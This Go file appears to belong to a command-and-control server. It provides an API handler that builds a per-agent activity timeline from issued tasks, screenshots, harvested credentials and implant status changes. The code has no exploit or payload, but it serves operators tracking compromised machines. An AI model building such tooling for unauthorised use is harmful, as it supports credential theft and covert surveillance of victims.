package server

import (
	"net/http"
	"path/filepath"
	"sort"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

// timelineEvent is one unified entry on an agent's activity timeline.
type timelineEvent struct {
	Time    time.Time `json:"time"`
	Kind    string    `json:"kind"` // task, screenshot, credential, status
	Type    string    `json:"type,omitempty"`
	Title   string    `json:"title"`
	Detail  string    `json:"detail,omitempty"`
	Status  string    `json:"status,omitempty"`
	RefID   uint      `json:"ref_id,omitempty"`
}

// handleAgentTimeline merges tasks, screenshots, harvested credentials and
// status changes into a single reverse-chronological feed for the agent page.
// GET /api/agents/:id/timeline?limit=200&kinds=task,screenshot
func (s *Server) handleAgentTimeline(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	limit := 200
	if v := atoiDefault(c.Query("limit"), 200); v >= 1 && v <= 1000 {
		limit = v
	}
	wantKinds := map[string]bool{}
	if kindsParam := c.Query("kinds"); kindsParam != "" {
		for _, k := range splitAndTrim(kindsParam, ",") {
			wantKinds[k] = true
		}
	}
	want := func(kind string) bool {
		if len(wantKinds) == 0 {
			return true
		}
		return wantKinds[kind]
	}

	events := make([]timelineEvent, 0, limit)

	// ── Tasks (skip noisy/no-op types to keep the feed readable) ──
	skipTypes := map[string]bool{
		"beacon_now": true, "set_sleep": true,
	}
	var tasks []struct {
		ID        uint      `json:"id"`
		Type      string    `json:"type"`
		Command   string    `json:"command"`
		Status    string    `json:"status"`
		CreatedAt time.Time `json:"created_at"`
	}
	q := s.db.Table("tasks").
		Select("id, type, command, status, created_at").
		Where("agent_id = ?", id)
	if err := q.Order("created_at desc").Limit(limit).Scan(&tasks).Error; err != nil {
		// Non-fatal: still render other sources.
		tasks = nil
	}
	for _, t := range tasks {
		if skipTypes[t.Type] {
			continue
		}
		title := t.Command
		if title == "" {
			title = t.Type
		}
		if len(title) > 120 {
			title = title[:120] + "…"
		}
		events = append(events, timelineEvent{
			Time: t.CreatedAt, Kind: "task", Type: t.Type,
			Title: title, Status: t.Status, RefID: t.ID,
		})
	}

	// ── Screenshots (files on disk; ModTime is the capture time) ──
	if s.cfg != nil && want("screenshot") {
		files := s.listScreenshotModTimes(id)
		for _, f := range files {
			events = append(events, timelineEvent{
				Time: f.modTime, Kind: "screenshot",
				Title: f.name,
			})
		}
	}

	// ── Harvested credentials ──
	if want("credential") {
		var creds []struct {
			ID        uint      `json:"id"`
			Domain    string    `json:"domain"`
			Username  string    `json:"username"`
			Type      string    `json:"type"`
			Source    string    `json:"source"`
			CreatedAt time.Time `json:"created_at"`
		}
		if err := s.db.Table("credential_entries").
			Select("id, domain, username, type, source, created_at").
			Where("agent_id = ?", id).
			Order("created_at desc").Limit(limit).Scan(&creds).Error; err != nil {
			creds = nil
		}
		for _, cr := range creds {
			detail := cr.Type
			if cr.Source != "" {
				detail += " · " + cr.Source
			}
			events = append(events, timelineEvent{
				Time: cr.CreatedAt, Kind: "credential",
				Title:  joinNonEmpty(cr.Domain, cr.Username, "\\"),
				Detail: detail, RefID: cr.ID,
			})
		}
	}

	// ── Status transitions ──
	if want("status") {
		var statuses []struct {
			ID        uint      `json:"id"`
			Status    string    `json:"status"`
			Timestamp time.Time `json:"timestamp"`
		}
		if err := s.db.Table("agent_status_events").
			Select("id, status, timestamp").
			Where("agent_id = ?", id).
			Order("timestamp desc").Limit(limit).Scan(&statuses).Error; err != nil {
			statuses = nil
		}
		for _, st := range statuses {
			events = append(events, timelineEvent{
				Time: st.Timestamp, Kind: "status",
				Title: st.Status, Status: st.Status, RefID: st.ID,
			})
		}
	}

	sort.Slice(events, func(i, j int) bool { return events[i].Time.After(events[j].Time) })
	if len(events) > limit {
		events = events[:limit]
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "events": events})
}

type screenshotMod struct {
	name    string
	modTime time.Time
}

func (s *Server) listScreenshotModTimes(agentID string) []screenshotMod {
	dir := filepath.Join(s.cfg.Server.DataDir, "screenshots", agentID)
	entries, err := listDirEntries(dir)
	if err != nil {
		return nil
	}
	out := make([]screenshotMod, 0, len(entries))
	for _, e := range entries {
		info, err := e.Info()
		if err != nil || info.IsDir() {
			continue
		}
		out = append(out, screenshotMod{name: e.Name(), modTime: info.ModTime()})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].modTime.After(out[j].modTime) })
	if len(out) > 100 {
		out = out[:100]
	}
	return out
}

var _ = strconv.Itoa
